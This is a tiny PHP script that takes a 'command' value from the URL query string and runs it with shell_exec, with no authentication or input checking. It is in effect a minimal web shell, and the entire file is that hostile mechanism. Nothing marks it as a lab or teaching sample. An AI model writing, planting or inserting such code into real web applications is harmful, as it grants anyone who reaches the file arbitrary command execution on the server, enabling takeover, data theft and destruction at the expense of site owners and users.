<?php
$command=$_GET['command'];
    // chdir('../');
    // $dir =  getcwd();
    $cmd  = shell_exec($command);
    return $cmd   ;
 

?>